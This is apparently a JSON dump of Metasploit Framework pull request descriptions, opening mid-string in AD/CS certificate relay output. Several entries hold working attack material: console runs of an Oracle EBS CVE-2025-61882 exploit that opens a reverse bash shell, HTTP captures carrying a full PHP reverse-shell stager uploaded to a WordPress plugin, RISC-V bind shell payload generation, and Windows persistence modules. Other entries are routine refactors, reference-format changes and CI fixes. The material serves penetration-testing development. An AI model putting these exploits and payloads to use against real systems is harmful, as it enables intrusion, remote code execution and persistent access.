Creating certificate request for  using the SubCA template\r\n[*] Generating CSR...\r\n[*] CSR Generated\r\n[*] Requesting relay target generate certificate...\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150543_default_10.5.132.180_mit.kerberos.cca_725235.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150544_default_10.5.132.180_mit.kerberos.cca_667357.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate generated using template SubCA and \r\n[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=297&\r\n[+] 10.5.132.180:88 - Received a valid TGT-Response\r\n[*] 10.5.132.180:80       - TGT MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150545_default_10.5.132.180_mit.kerberos.cca_662646.bin\r\n[+] 10.5.132.180:88 - Received a valid TGS-Response\r\n[*] 10.5.132.180:80       - TGS MIT Credential Cache ticket saved to /home/tmoose/.msf4/loot/20251205150546_default_10.5.132.180_mit.kerberos.cca_344890.bin\r\n[+] 10.5.132.180:88 - Received a valid delegation TGS-Response\r\n[+] Certificate for  using template SubCA saved to /home/tmoose/.msf4/loot/20251205150546_default_10.5.132.180_windows.ad.cs_209545.pfx\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(admin/http/web_enrollment_cert) > \r\n```\r\n</details>\r\n","title":"Add Authenticating Web Enrollment module for AD/CS"},{"body":"Updates the windows sticky keys post persistence to the new mixin, Part of #20374\r\n\r\n\r\n## Verification\r\n\r\n- [ ] Start `msfconsole`\r\n- [ ] exploit the box somehow\r\n- [ ] `use exploit/windows/persistence/accessibility_features_debugger`\r\n- [ ] `set SESSION <id>`\r\n- [ ] `exploit`\r\n- [ ] **Verify** persistence is created, and you get a new session if apt is run\r\n- [ ] **Verify** cleanup works\r\n- [ ] **Document** is updated and correct","title":"update windows sticky keys to persistence mixin"},{"body":"## Vulnerable Application\r\nThis module exploits CVE-2025-61882, a critical Remote Code Execution (RCE) vulnerability in Oracle E-Business Suite (EBS).\r\nThe flaw allows unauthenticated attackers to execute arbitrary code by leveraging a combination of SSRF, HTTP request smuggling and XSLT injection.\r\n- **CVSS Score**: 9.8 Critical\r\n- **Affected Versions**: Oracle E-Business Suite, versions 12.2.3-12.2.14\r\n- **Tested On**: Oracle EBS 12.2.12 (Linux host)\r\n\r\n## Testing\r\n\r\n- App images files are available on Oracle website (Oracle Software Delivery Cloud)\r\n- You can follow this [setup guide for Oracle EBS](https://blog.rishoradev.com/2021/04/12/oracle-ebs-r12-on-virtualbox)\r\n\r\n**Note**: 300 Go are required and a few hours for the inital image creation\r\n\r\n\r\n## Verification Steps\r\n1. Start msfconsole\r\n2. `use exploit/multi/http/oracle_ebs_cve_2025_61882_exploit_rce`\r\n3. `set RHOST <TARGET_IP_ADDRESS>`\r\n5. `set PAYLOAD (default is cmd/unix/reverse_bash)`\r\n6. `set LHOST <YOUR_ATTACKER_IP>`\r\n7. `set LPORT 4444`\r\n8. `check`\r\n9. `exploit`\r\n\r\n## Scenarios\r\n\r\n### Linux Command\r\n\r\n```\r\nuse exploit/multi/http/oracle_ebs_cve_2025_61882_exploit_rce\r\n\r\nmsf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > set LHOST 192.168.56.1\r\nLHOST => 192.168.56.1\r\nmsf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > set SRVPORT 1337\r\nSRVPORT => 1337\r\nmsf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > set RHOSTS 192.168.56.104\r\nRHOSTS => 192.168.56.104\r\n\r\nshow options\r\n\r\nModule options (exploit/multi/http/oracle_ebs_cve_2025_61882_exploit_rce):\r\n\r\n   Name           Current Setting  Required  Description\r\n   ----           ---------------  --------  -----------\r\n   HTTP_TIMEOUT   20               yes       Time to wait for target to fetch XSL (seconds)\r\n   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOSTS         192.168.56.104   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n   RPORT          8000             yes       The target port (TCP)\r\n   SHELL_TIMEOUT  30               yes       Time to wait for shell after XSL delivery (seconds)\r\n   SRVHOST        0.0.0.0          yes       The local host to listen on for XSL callback\r\n   SRVPORT        1337             yes       The local port to listen on for XSL callback\r\n   SSL            false            no        Negotiate SSL/TLS for outgoing connections\r\n   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)\r\n   TARGETURI      /                yes       Base path to Oracle EBS\r\n   URIPATH                         no        The URI to use for this exploit (default is random)\r\n   VHOST                           no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/unix/reverse_bash):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST  192.168.56.1     yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Linux/Unix (Interactive Shell)\r\n\r\n\r\nmsf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > check\r\n[*] 192.168.56.104:8000 - The target appears to be vulnerable.\r\n\r\n\r\nmsf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > exploit\r\n[*] Exploit running as background job 7.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on 192.168.56.1:4444 \r\n[*] Starting HTTP server on 0.0.0.0:1337\r\n[*] Using URL: http://192.168.56.1:1337/\r\n[*] XSL payload will be served at: http://192.168.56.1:1337/HexdwvgO.xsl\r\n[*] Retrieving CSRF token from target...\r\n[+] CSRF token retrieved: 86AJ-2RR3-XDNC-U9I4-Y...\r\n[*] Creating HTTP request smuggling payload...\r\n[*] Triggering exploitation via UiServlet...\r\n[+] Received request: GET /OA_HTML/ieshostedsurvey.xsl from 192.168.56.104:63162\r\n[+] Serving  XSL payload to 192.168.56.104...\r\n[+] XSL payload delivered successfully to 192.168.56.104 (1460 bytes)\r\n[*] Keeping HTTP server alive, waiting for callback to 192.168.56.1:4444...\r\n[*] (Press Ctrl-C to stop)\r\n[*] Waiting up to 30 seconds for reverse shell connection...\r\n[+] Session created successfully!\r\n[*] Server stopped.\r\n[*] Command shell session 7 opened (192.168.56.1:4444 -> 192.168.56.104:61062) at 2025-12-05 09:14:42 +0100\r\nsessions 7\r\n[*] Starting interaction with 7...\r\n\r\nid\r\nuid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=system_u:system_r:initrc_t:s0\r\nuname -a\r\nLinux apps 5.4.17-2136.338.4.2.el7uek.x86_64 #3 SMP Mon Dec 23 14:42:43 PST 2024 x86_64 x86_64 x86_64 GNU/Linux\r\npwd\r\n/u01/install/APPS/fs1/FMW_Home/user_projects/domains/EBS_domain\r\n\r\n```","title":"Add exploit oracle ebs CVE 2025 61882 module"},{"body":"This fixes a bug in `unix/webapp/wp_reflexgallery_file_upload` where the current year and month are forced in the request.\r\n\r\nThis causes the server to reject the exploit there is no folder in `wp-content/uploads` for the current year and month.\r\n\r\nThe original source code of the vulnerable plugin looks like this:\r\n\r\nhttps://github.com/wp-plugins/reflex-gallery/blob/9d23d8c81c4f30c83d9aa5ba0cbb03f1126b071f/admin/scripts/FileUploader/php.php#L172\r\n```php\r\n// list of valid extensions, ex. array(\"jpeg\", \"xml\", \"bmp\")\r\n$allowedExtensions = array();\r\n// max file size in bytes\r\n$sizeLimit = ini_get('upload_max_filesize') * 1024 * 1024;\r\n\r\n$uploader = new qqFileUploader($allowedExtensions, $sizeLimit);\r\n$result = $uploader->handleUpload('../../../../../uploads/'.$_GET['Year'].'/'.$_GET['Month'].'/');\r\n// to pass data through iframe you will need to encode all html tags\r\necho htmlspecialchars(json_encode($result), ENT_NOQUOTES);\r\n```\r\n\r\n## Verification\r\n\r\n- [ ] Configure a Wordpress server using a vulnerable version of the plugin (<= 3.1.3).\r\n- [ ] Make sure no uploads are present for the current year/month.\r\n- [ ] Try the current version, and it should fail, since the (as of time of writing), the 2025/12 folder should not exist.\r\n\r\nThis is the capture for the current version:\r\n```http\r\nPOST /app/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2025&Month=12 HTTP/1.1\r\nHost: 192.168.100.171\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\nContent-Type: multipart/form-data; boundary=---------------------------036324264670751490433286373345\r\nContent-Length: 1361\r\n\r\n-----------------------------036324264670751490433286373345\r\nContent-Disposition: form-data; name=\"qqfile\"; filename=\"qhPDqfxjUcScrBd.php\"\r\nContent-Type: application/octet-stream\r\n\r\n/*<?php /**/ error_reporting(0); $ip = '192.168.2.225'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();\r\n-----------------------------036324264670751490433286373345--\r\n\r\nHTTP/1.1 200 OK\r\nDate: Wed, 03 Dec 2025 19:53:28 GMT\r\nServer: Apache/2.4.6 (CentOS) PHP/5.4.16\r\nX-Powered-By: PHP/5.4.16\r\nContent-Length: 62\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n{\"error\":\"Directory does not exist and could not be created.\"}\r\n```\r\n- [ ] Try the patched version\r\n\r\nThe capture should look like this:\r\n```http\r\nPOST /app/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php HTTP/1.1\r\nHost: 192.168.100.171\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15\r\nContent-Type: multipart/form-data; boundary=---------------------------270729496445002100805631219942\r\nContent-Length: 1360\r\n\r\n-----------------------------270729496445002100805631219942\r\nContent-Disposition: form-data; name=\"qqfile\"; filename=\"yCMgppBfCGdork.php\"\r\nContent-Type: application/octet-stream\r\n\r\n/*<?php /**/ error_reporting(0); $ip = '192.168.2.225'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();\r\n-----------------------------270729496445002100805631219942--\r\n\r\nHTTP/1.1 200 OK\r\nDate: Wed, 03 Dec 2025 20:57:47 GMT\r\nServer: Apache/2.4.6 (CentOS) PHP/5.4.16\r\nX-Powered-By: PHP/5.4.16\r\nContent-Length: 54\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n{\"success\":true,\"fileName\":\"\\/\\/\\/yCMgppBfCGdork.php\"}\r\n```\r\n\r\n## Notes\r\n\r\nSince the path can be customized with a year and month that are arbitrary, it could be worthwhile to add a `PATH` option so you can choose where to upload.\r\n","title":"Remove current date constraint from uploaded path in `wp_reflexgallery_file_upload`"},{"body":"Hello Metasploit Team,\r\n\r\nThis commit introduces a clear separation between SSL options for client connections (`SSL`) and server connections (`SRVSSL`) to prevent accidental HTTPS server activation and improve module clarity.\r\n\r\n## Problem\r\n\r\nPreviously, the `SSL` datastore option was used for both client-side connections (via `HttpClient`, `Tcp`) and server-side connections (via `HttpServer`, `FtpServer`). This created a dangerous coupling where enabling `SSL => true` for client connections could inadvertently activate HTTPS on the server side, causing exploits to fail silently.\r\n\r\nModules had to use workarounds like temporarily modifying the `SSL` datastore option when starting servers:\r\n\r\n```ruby\r\noriginal_ssl = datastore['SSL']\r\ndatastore['SSL'] = false\r\nstart_service({ 'Path' => '/' })\r\ndatastore['SSL'] = original_ssl\r\n```\r\n\r\nWhile it was possible to pass `ssl` as a parameter to `start_service()`, this approach was inconsistent and still relied on the `SSL` datastore option as a fallback, making the behavior unpredictable and potentially causing silent failures during exploitation. Additionally, the parameter name has been changed from `ssl` to `Ssl` (with capital S) to be consistent with other option names like `ServerPort` and `ServerHost`.\r\n\r\n## Changes\r\n\r\n- Add `SRVSSL` option in `SocketServer` mixin (default: false)\r\n- Remove `SSL` option from `TcpServer` (now uses SRVSSL from SocketServer)\r\n- Update `HttpServer.start_service` to accept `opts['Ssl']` as override (for explicit control, though `SRVSSL` works implicitly)\r\n- All modules now automatically use `SRVSSL` for server-side SSL configuration via `TcpServer.ssl()`\r\n- Update modules that explicitly used `'ssl' => false` to use `'Ssl' => false` for clarity\r\n- Update documentation to reflect `SRVSSL` usage\r\n- Update `msftidy` to recognize `SRVSSL` as universal option\r\n\r\nThis ensures that server and client SSL configurations are independent, preventing unintended HTTPS server activation when `SSL` is enabled for client connections.\r\n\r\n## Benefits\r\n\r\nWith this change, exploit modules no longer need to temporarily modify the `SSL` datastore option when starting HTTP servers. The `SRVSSL` option works implicitly, but modules can also pass `'Ssl' => false` (or `true`) as an explicit override to `start_service()` if they prefer to be explicit. This eliminates workarounds, removes hidden behavior that could cause silent failures, and makes SSL configuration explicit and predictable.","title":"Separate SSL and SRVSSL options for client and server connections"},{"body":"This adds the missing references to MITRE ATT&CK techniques in the Kerberos-related modules and the modules involved in unconstrained delegation attacks.","title":"Add MITRE ATT&CK techniques to Kerberos and unconstrained delegation modules"},{"body":"Fixes #20172\r\n\r\nBoth bailiwicked modules were throwing 'undefined method each for IPAddr' exceptions due to DNS library changes. Fixed by:\r\n\r\n1. Wrapping IPAddr object in array when passing to nameservers parameter\r\n   - Changed nameservers: rr1.address to nameservers: [rr1.address.to_s]\r\n   - Applies to both bailiwicked_domain.rb and bailiwicked_host.rb\r\n\r\n2. Changed SRCPORT default from nil to 0 for automatic port selection\r\n   - Prevents validation errors when running modules\r\n   - 0 is the documented value for automatic port selection\r\n\r\n## Verification\r\n- Fixes the NoMethodError exception reported in #20172\r\n- SRCPORT now uses a valid default value (0) for automatic port selection\r\n- Code follows the pattern used in other DNS resolver initializations in the codebase","title":"Fix Bailiwicked module exceptions and SRCPORT default"},{"body":"Boilerplate code. Untested.\r\n","title":"Add Linux RISC-V command payload adapters"},{"body":"Add Linux RISC-V 32-bit/64-bit TCP bind shell payloads.\r\n\r\n# Source\r\n\r\n* https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/\r\n* https://web.archive.org/web/20230326161514/https://github.com/odzhan/shellcode/commit/d3ee25a6ebcdd21a21d0e6eccc979e45c24a9a1d\r\n* https://github.com/bcoles/shellcode/blob/main/riscv32/bindshell/bind.s\r\n\r\n\r\n# Verification\r\n\r\nTested with QEMU. For other test environments, see https://github.com/rapid7/metasploit-framework/pull/19518#issuecomment-2385330975.\r\n\r\nGenerate a Linux Command Shell, Bind TCP Inline payload (with optional NOP sled):\r\n\r\n```\r\n./msfvenom -n 100 -f elf -p linux/riscv64le/shell_bind_tcp LPORT=1337 > bind.elf\r\n```\r\n\r\n```\r\n./msfvenom -n 100 -f elf -p linux/riscv32le/shell_bind_tcp LPORT=1337 > bind.elf\r\n```\r\n\r\nExecute the payload with QEMU:\r\n\r\n```\r\n$ /home/user/qemu/build/qemu-riscv64 -strace ./bind.elf\r\n```\r\n\r\n```\r\n$ /home/user/qemu/build/qemu-riscv32 -strace ./bind.elf\r\n```\r\n\r\nNote the payload was executed successfully (`lsof -i :1337`) :)\r\n\r\nConnect to the bindshell with netcat `nc HOST 1337` (or use `exploit/multi/handler`).\r\n","title":"Add Linux RISC-V 32-bit/64-bit TCP bind shell payloads"},{"body":"The SACL field within security descriptors typically requires elevated privileges to be read. This means that by default if a user queries a security descriptor and does not have the privileges to read the SACL, the entire field is omitted. Microsoft provides a control that can be applied to the query to toggle this, allowing the rest of the security descriptor to be returned where otherwise it'd be omitted. This PR exposes Metasploit's existing control construction as a datastore option so that users may turn this on and off at while. This means that underpriviliged users can not query for security descriptors and get the majority of the data in the field.\r\n\r\n## Verification\r\n\r\nList the steps needed to make sure this thing works\r\n\r\n- [ ] Put this updated/hacked version of the `ENUM_ACCOUNTS` query into the local query file at `~/.msf4/ldap_queries.yaml`, it includes the `nTSecurityDescriptor` field.\r\n- [ ] Start msfconsole and load the `ldap_query` module\r\n- [ ] Run the `HACKED_ENUM_ACCOUNTS` action with a normal user account and `LDAP::QuerySacl=false`, see the security descriptor field is present\r\n- [ ] Toggle `LDAP::QuerySacl` back to true and run it again, see no security descriptor field (this is the old behavior where the SACL is included by default)\r\n\r\n```\r\n---\r\nqueries:\r\n  - action: HACKED_ENUM_ACCOUNTS\r\n    description: 'Dump info about all known user accounts in the domain.'\r\n    filter: '(|(objectClass=organizationalPerson)(sAMAccountType=805306368)(objectcategory=user)(objectClass=user))'\r\n    attributes:\r\n      - dn\r\n      - name\r\n      - nTSecurityDescriptor\r\n      - description\r\n      - displayName\r\n      - sAMAccountName\r\n      - objectSID\r\n      - userPrincipalName\r\n      - userAccountControl\r\n      - homeDirectory\r\n      - homeDrive\r\n      - profilePath\r\n      - memberof\r\n      - lastLogoff\r\n      - lastLogon\r\n      - lastLogonDate\r\n      - logonCount\r\n      - badPwdCount\r\n      - pwdLastSet\r\n      - SmartcardLogonRequired\r\n      - LastBadPasswordAttempt\r\n      - PasswordLastSet\r\n      - PaswordNeverExpires\r\n    references:\r\n      - http://www.ldapexplorer.com/en/manual/109050000-famous-filters.htm\r\n      - https://adsecurity.org/wp-content/uploads/2016/08/DEFCON24-2016-Metcalf-BeyondTheMCSE-RedTeamingActiveDirectory.pdf\r\n```","title":"Allow toggling the SACL in LDAP queries"},{"body":"Should fix most of the Meterpreter acceptance tests. This whole things was a giant exercise in CI whack a mole where almost all of the issues were related to the runners and not actually in Meterpreter.\r\n\r\nRequires https://github.com/rapid7/metasploit-payloads/pull/787 for the one issue that was due to Meterpreter.\r\n\r\n* Drops PHP 5 from the test suite, for whatever reason it's not working on Windows despite working locally\r\n* Updates the mac runners from 13 to 15 to fix PHP\r\n    * Drops the railgun tests on the mac runners because they're ARM now and railgun doesn't support ARM\r\n* Drops Java 8, Java 8 isn't installing on the new mac runners\r\n* Adds Java 11 as an older version for testing","title":"Fix the flakey UDP channel tests"},{"body":"Hello Metasploit Team,\n\nThis PR adds an authenticated remote code execution module for FreePBX filestore module (CVE-2025-64328).\n\nThe vulnerability exists in the SSH driver's testconnection functionality. The `check_ssh_connect()` function accepts user-controlled input for the SSH key path parameter, which is passed unsanitized to `exec()` calls when generating SSH keys, allowing command injection via shell command substitution syntax.\n\nThis vulnerability affects filestore module versions 17.0.2.36 through 17.0.2.44 (9 versions total). I verified the lower bound (17.0.2.36) by analyzing the git history - the vulnerable file was introduced in this version. Versions >= 17.0.2.36 && < 17.0.3 are affected, and 17.0.3 is patched (as per GHSA-vm9p-46mv-5xvw).\n\nThe module requires valid FreePBX credentials for a user account in the \"Filestore\" group (administrator or low-privilege user).\n\nThe module includes automatic version detection, support for both administrator and low-privilege users, and comprehensive documentation with Docker setup instructions.\n\n**Note:** I also renamed the `XorcomCompletePbx` mixin to `CompletePBX` and updated the module name references in 3 Xorcom modules. I found this naming more consistent and cleaner.\n\nThanks","title":"Add authenticated RCE module for FreePBX filestore (CVE-2025-64328)"},{"body":"Adds support for GHSA (GitHub Security Advisory) and OSV (Open Source Vulnerabilities) references in Metasploit modules. Modules can now use structured reference formats instead of full URLs.\r\n\r\n## GHSA Support\r\n\r\nThe format depends on whether the GHSA is available globally or repository-specific:\r\n\r\n- Global format: `['GHSA', 'xxxx-xxxx-xxxx']` => `https://github.com/advisories/GHSA-xxxx-xxxx-xxxx`\r\n- Repository-specific format: `['GHSA', 'xxxx-xxxx-xxxx', 'owner/repo']` => `https://github.com/owner/repo/security/advisories/GHSA-xxxx-xxxx-xxxx`\r\n\r\n## OSV Support\r\n\r\nOSV (Open Source Vulnerabilities) is a modern vulnerability database created by Google that aggregates 15+ sources and covers 25+ ecosystems (Go, Python, npm, Maven, RubyGems, GitHub advisories, and more). It provides a unified format for open source vulnerabilities.\r\n\r\n- Format: `['OSV', 'ECOSYSTEM-YEAR-ID']` => `https://osv.dev/vulnerability/ECOSYSTEM-YEAR-ID`\r\n- Examples: `['OSV', 'GO-2021-0113']`, `['OSV', 'PYSEC-2024-123']`, `['OSV', 'GHSA-8c52-x9w7-vc95']`\r\n- Supports all OSV formats including ecosystem-specific IDs (GO-*, PYSEC-*, GHSA-*, MINI-*, etc.)\r\n\r\nThis PR also:\r\n- Updates existing modules to use the correct repository-specific format where needed, ensuring all GHSA references are accessible and properly linked\r\n- Fixes a bug with nested array structures in module references that could cause `TypeError`\r\n- Adds validation to prevent nested arrays in references (fixing a 20-year-old bug in the core)\r\n- Adds string conversion safety for reference initialization (handles ATT&CK constants and edge cases)","title":"Add GHSA and OSV reference type support"},{"body":"Updates the windows wmi persistence to the new mixin. The original persistence worked in several different and very cool ways, and I felt it would be best to split them out instead of complicating the datastore based on which technique was chosen. Part of #20374\r\n\r\n@NickTyrer not sure if you are still around, but I love this module, its stealthy, the module was well written and easy to follow. Props from future!\r\n\r\nAs noted in the files:\r\nwmic will be removed Windows 11, version 25H2 or Windows 11, version 24H2 in favor of powershell\r\nsource https://support.microsoft.com/en-us/topic/windows-management-instrumentation-command-line-wmic-removal-from-windows-e9e83c7f-4992-477f-ba1d-96f694b8665d\r\n\r\n## To Do:\r\nFinish testing each module (only event_log is done)\r\nWrite docs\r\nMake cleanup work (currently failing)\r\n\r\n## Verification\r\n\r\n- [ ] Start `msfconsole`\r\n- [ ] exploit the box somehow\r\n- [ ] `use exploit/windows/persistence/wmi/<select a module>`\r\n- [ ] `set SESSION <id>`\r\n- [ ] `exploit`\r\n- [ ] **Verify** persistence is created, and you get a new session after doing the trigger\r\n- [ ] **Verify** cleanup works\r\n- [ ] **Document** is updated and correct","title":"Update windows wmi to persistence mixin"}]
